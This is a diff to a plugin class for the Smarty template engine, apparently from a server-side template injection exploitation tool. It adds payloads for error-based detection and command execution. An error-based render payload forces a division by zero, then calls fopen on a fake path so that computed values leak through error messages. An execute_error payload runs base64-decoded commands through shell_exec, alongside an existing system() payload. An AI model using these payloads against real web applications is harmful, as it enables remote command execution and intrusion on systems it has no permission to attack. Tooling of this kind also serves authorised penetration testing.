@@ -27,6 +27,15 @@ class Smarty(php.Php):
                 'test_render': f"""{{{rand.randints[0]}}}{{*{rand.randints[1]}*}}{{{rand.randints[2]}}}""",
                 'test_render_expected': f'{rand.randints[0]}{rand.randints[2]}'
             },
+            'render_error': {
+                'render': """{code}""",
+                'wrapper_type': "global",
+                # File path "Y:/A:/..." is unlikely to exist
+                'header': """{{* 1 / 0 *}}{{fopen("Y:/A:/"|cat:strval({header[0]}+{header[1]})|cat:rtrim(strval(""",
+                'trailer': """))|cat:strval({trailer[0]}+{trailer[1]}), "r")}}""",
+                'test_render': f'"{rand.randints[0]}"+"{rand.randints[1]}"',
+                'test_render_expected': f'{rand.randints[0] + rand.randints[1]}'
+            },
             'evaluate': {
                 # Dirty hack from Twig
                 'call': 'execute',
@@ -44,6 +53,10 @@ class Smarty(php.Php):
                 'execute': """{{if system(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))}}{{/if}}""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2]
+            },
+            'execute_error': {
+                # Using shell_exec to get full output
+                'execute': """shell_exec(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))"""
             },
             'execute_blind': {
                 'call': 'inject',
